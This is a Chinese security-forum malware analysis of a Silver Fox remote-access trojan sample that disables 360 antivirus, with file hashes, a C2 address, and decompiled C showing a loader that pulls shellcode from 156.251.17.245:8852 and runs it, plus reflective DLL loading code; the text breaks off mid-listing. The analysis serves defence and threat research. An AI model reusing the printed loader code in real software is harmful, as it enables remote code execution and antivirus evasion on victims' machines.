---
title: 【病毒分析】R3强杀360：银狐远控病毒再进化
url: https://forum.butian.net/share/4139
source: 奇安信攻防社区
date: 2025-02-18
fetch_date: 2025-10-06T20:35:04.189465
---

# 【病毒分析】R3强杀360：银狐远控病毒再进化

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 【病毒分析】R3强杀360：银狐远控病毒再进化

* [移动安全](https://forum.butian.net/topic/50)

1. 背景
1.1 病毒介绍
  银狐病毒自2022年起活跃，主要针对中国用户和企事业单位，尤其是财务、管理和专业领域的从业人员。该病毒通过多种攻击手段传播，包括伪装为税务、财务相关文件的钓鱼邮...

1. 背景
=====
1.1 病毒介绍
--------
银狐病毒自2022年起活跃，主要针对中国用户和企事业单位，尤其是财务、管理和专业领域的从业人员。该病毒通过多种攻击手段传播，包括伪装为税务、财务相关文件的钓鱼邮件、社交平台的恶意链接，以及利用SEO（搜索引擎优化）确保其钓鱼网站在中国搜索引擎中的排名靠前。此外，银狐还结合恶意广告投放和多次电子邮件钓鱼活动，分发远程管理木马（RATs），以实现对受害者设备的远程控制和数据窃取。
以下为近期捕获到的一起银狐病毒样本，我们对其进行了深入分析。
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/01/attach-7419b00076436c722a63d0aa2312aec1e778c2de.png)
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/01/attach-812f26d1d18883aa4cc12f22cd88bfe945f27011.png)
2. 文件分析
=======
2.1 基本信息
--------
| 文件名 | 明细查看\\_Setup.exe |
|---|---|
| 大小 | 2.67 MB |
| 操作系统 | Windows(Vista)\[AMD64, 64位, GUI\] |
| 模式 | 32 位 |
| 类型 | EXEC |
| 字节序 | LE |
| MD5 | 1a416558435d62dcca79346e6b839370 |
| SHA1 | 039e938f5af45edc168c6aa6ebe450f2bc7eddd7 |
| SHA256 | 035d72733b7ef722b7a8c7f067ff558f04c737cf0231aea54a6567a39ef84aea |
### 2.1.1 程序执行流程
程序执行流程如下，通过多次远程加载shellcode执行远控
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/01/attach-d3fa726fb6c9db1163a28572920325599570413e.png)
### 2.1.2 初次远程加载shellcode
程序入口为start
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/01/attach-5560d98088a7689f56a0cb54b37b1963ed985571.png)
其中第一个函数便是用于加载shellcode的
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/01/attach-71adfb5351db80620bc9bfb78cdb8200658a5a3b.png)
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/01/attach-87d5420b33066b5dc3101dea1465a16c787743cf.png)
遍历函数数组逐个执行函数
```C
int shellcode\_execute\_1()
{
int result; // eax
int v1; // edi
int v2; // ebx
void (\*v3)(void); // esi
unsigned int v4[6]; // [esp-Ch] [ebp-1Ch] BYREF
int v5; // [esp+Ch] [ebp-4h]
int savedregs; // [esp+10h] [ebp+0h] BYREF
result = dword\_6827D0;
if ( dword\_6827D0 )
{
v1 = \*(\_DWORD \*)dword\_6827D0;
v2 = 0;
v5 = \*(\_DWORD \*)(dword\_6827D0 + 4);
v4[2] = (unsigned int)&amp;savedregs;
v4[1] = (unsigned int)&amp;loc\_40508D;
v4[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList;
\_\_writefsdword(0, (unsigned int)v4);
if ( v1 &gt; 0 )
{
do
{
v3 = \*(void (\*\*)(void))(v5 + 8 \* v2++);
dword\_6827D4 = v2;
if ( v3 )
v3();
}
while ( v1 &gt; v2 );
}
result = 0;
\_\_writefsdword(0, v4[0]);
}
return result;
}
```
如下
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/01/attach-07a418f0cb72b365966ba631d5dae6a4e7a82025.png)
最后执行用于远程加载shellcode的函数
```C
int sub\_65D174()
{
int v1; // [esp+0h] [ebp-204h] BYREF
\_DWORD v2[4]; // [esp+190h] [ebp-74h] BYREF
int (\_\_stdcall \*VirtualAlloc)(\_DWORD, int, int, int); // [esp+1A0h] [ebp-64h]
void (\_\_stdcall \*WSAStartup)(int, int \*); // [esp+1ACh] [ebp-58h]
int (\_\_stdcall \*socket)(int, int, \_DWORD); // [esp+1B0h] [ebp-54h]
int (\_\_stdcall \*htons)(int); // [esp+1B4h] [ebp-50h]
void (\_\_stdcall \*connect)(int, \_WORD \*, int); // [esp+1BCh] [ebp-48h]
int (\_\_stdcall \*recv)(int, char \*, int, \_DWORD); // [esp+1C8h] [ebp-3Ch]
int v9; // [esp+1CCh] [ebp-38h]
int v10; // [esp+1D0h] [ebp-34h]
\_WORD v11[2]; // [esp+1D4h] [ebp-30h] BYREF
int ip\_addr; // [esp+1D8h] [ebp-2Ch]
int (\*v13)(void); // [esp+1E4h] [ebp-20h]
int v14; // [esp+1E8h] [ebp-1Ch]
char v15[8]; // [esp+1ECh] [ebp-18h] BYREF
char v16[8]; // [esp+1F4h] [ebp-10h] BYREF
int v17; // [esp+1FCh] [ebp-8h]
int v18; // [esp+200h] [ebp-4h]
sub\_65D284(v2);
v13 = (int (\*)(void))VirtualAlloc(0, 122880, 12288, 64);
v17 = 0;
v10 = 4096;
v9 = 118784;
WSAStartup(514, &amp;v1);
v14 = socket(2, 1, 0);
v11[0] = 2;
v11[1] = htons(8852);
ip\_addr = 0xF511FB9C;
connect(v14, v11, 16);
while ( 1 )
{
v18 = recv(v14, (char \*)v13 + v17, 4096, 0);
if ( v18 &lt;= 0 )
break;
v17 += v18;
}
strcpy(v16, "hello");
strcpy(v15, "hel1o");
return v13();
}
```
### 2.1.3 二次远程加载shellcode
向地址[156.251.17.245:8852](https://x.threatbook.com/v5/ip/156.251.17.245)发送请求远程加载shellcode
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/01/attach-cc01c06fc4ef8a9138eae2b2fc580535d7f3d15d.png)
然后指针执行shellcode
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/01/attach-f862eb0ef7b8d60aa98a953b69839254676db2d6.png)
发现指针unk\\_3470BD7指向一个pe文件
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/01/attach-83b9af259f5ba22e86ac631f56f83c03ed2d7d7a.png)
将其dump下来
2.2 反射加载dll
-----------
### 2.2.1 dll初步分析
发现是一个dll文件
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/01/attach-2fe17358da96babb67cbe2eadaa48660bcf879b6.png)
其中这个dll提供了一个导出函数
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/01/attach-5c01baa23a5343d52ceba40e138d4ed5f45696e5.png)
初步查看似乎是与关闭360相关的
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/01/attach-1f769af9e990d73a80e0664783ab20fae4eb626b.png)
### 2.2.2 加载函数并进行dll的校验
加载函数
```C
kernel32\_dll\_str[0] = 'k';
kernel32\_dll\_str[1] = 'e';
kernel32\_dll\_str[4] = 'e';
kernel32\_dll\_str[6] = '3';
kernel32\_dll\_str[7] = '2';
kernel32\_dll\_str[8] = '.';
v112 = 0;
VirtualAlloc = 0;
FlushInstructionCache = 0;
GetNativeSystemInfo = 0;
VirtualProtect = 0;
Sleep\_1 = 0;
v118 = 0;
kernel32\_dll\_str[2] = 'r';
kernel32\_dll\_str[3] = 'n';
kernel32\_dll\_str[5] = 'l';
kernel32\_dll\_str[9] = 'd';
kernel32\_dll\_str[10] = 'l';
kernel32\_dll\_str[11] = 'l';
qmemcpy(Sleep, "Sleep", 5);
qmemcpy(v106, "VirtualAllocLoadLibraryAVirtualProtect", 38);
qmemcpy(v109, "FlushInstructionCache", 21);
qmemcpy(v107, "GetNativeSystemInfo", 19);
qmemcpy(v108, "RtlAddFunctionTable", 19);
LdrLoadDll = (void (\_\_stdcall \*)(\_DWORD, \_DWORD, \_WORD \*, int \*))LdrGetProcedureAddress(v86, v88, v90, v92);
ProcedureAddress = (char \*)LdrGetProcedureAddress(v87, v89, v91, v93);
v120 = kernel32\_dll\_str;
v119[1] = 24;
v119[0] = 24;
v103 = ProcedureAddress;
LdrLoadDll(0, 0, v119, &amp;v97);
v94 = 0xC000C;
v95 = v106;
((void (\_\_stdcall \*)(int, int \*, \_DWORD, int (\_\_stdcall \*\*)(\_DWORD, int, int, int)))ProcedureAddress)(
v97,
&amp;v94,
0,
&amp;VirtualAlloc);
v94 = 917518;
v95 = &amp;v106[6];
((void (\_\_stdcall \*)(int, int \*, \_DWORD, \_DWORD))ProcedureAddress)(v97, &amp;v94, 0, &amp;VirtualProtect);
v94 = 1376277;
v95 = v109;
((void (\_\_stdcall \*)(int, int \*, \_DWORD, void (\_\_stdcall \*\*)(int, \_DWORD, \_DWORD)))ProcedureAddress)(
v97,
&amp;v94,
0,
&amp;FlushInstructionCache);
v94 = 1245203;
v95 = v107;
((void (\_\_stdcall \*)(int, int \*, \_DWORD, void (\_\_stdcall \*\*)(char \*)))ProcedureAddress)(
v97,
&amp;v94,
0,
&amp;GetNativeSystemInfo);
v94 = 0x50005;
v95 = Sleep;
((void (\_\_stdcall \*)(int, int \*, \_DWORD, void (\_\_stdcall \*\*)(unsigned int)))ProcedureAddress)(v97, &amp;v94, 0, &amp;Sleep\_1);
v94 = 1245203;
v95 = v108;
((void (\_\_stdcall \*)(int, int \*, \_DWORD, int \*))ProcedureAddress)(v97, &amp;v94, 0, &amp;v118);
v94 = 0xC000C;
v95 = &amp;v106[3];
((void (\_\_stdcall \*)(int, int \*, \_DWORD, int (\_\_stdcall \*\*)(int)))ProcedureAddress)(v97, &amp;v94, 0, &amp;v112);
if ( !VirtualAlloc )
return 0;
if ( !VirtualProtect )
return 0;
if ( !Sleep\_1 )
return 0;
if ( !FlushInstructionCache )
return 0;
if ( !GetNativeSystemInfo )
return 0;
```
获取dll中导出函数的地址
```C
int \_\_stdcall LdrGetProcedureAddressForCaller(int a1, int a2, int a3, int a4)
{
void \*retaddr; // [esp+4h] [ebp+4h]
return ((int (\_\_stdcall \*)(int, int, int, int, \_DWORD, void \*))ntdll\_LdrGetProcedureAddressForCaller)(
a1,
a2,
a3,
a4,
0...